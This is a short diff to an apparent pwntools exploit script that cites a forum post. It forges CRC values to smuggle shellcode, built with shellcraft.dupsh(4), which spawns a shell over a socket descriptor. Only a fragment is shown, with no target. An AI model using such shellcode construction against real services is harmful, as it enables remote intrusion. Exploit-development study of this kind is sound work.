@@ -1,7 +1,7 @@
 # https://rdot.org/forum/showthread.php?s=cdfb948132c4ae696255974aa11d760d&p=35851#post35851
 
 from pwn import *
-context('i386', 'linux', 'ipv4')
+#context('i386', 'linux', 'ipv4')
 
 from struct import unpack, pack
 
@@ -71,7 +71,7 @@ def forge(wanted_crc, str, pos=None):
 salt = '92a404a647511c0017ee'.decode('hex')
 print 'SALT %s' % salt.encode('hex')
 
-sc = asm(shellcode.dupsh(4)).ljust(36, '\x00')
+sc = asm(shellcraft.dupsh(4)).ljust(36, '\x00')
 t = p32(len(sc) / 4)
 for i in xrange(0, len(sc), 4):
     r = forge(u32(sc[i:i + 4]), salt)
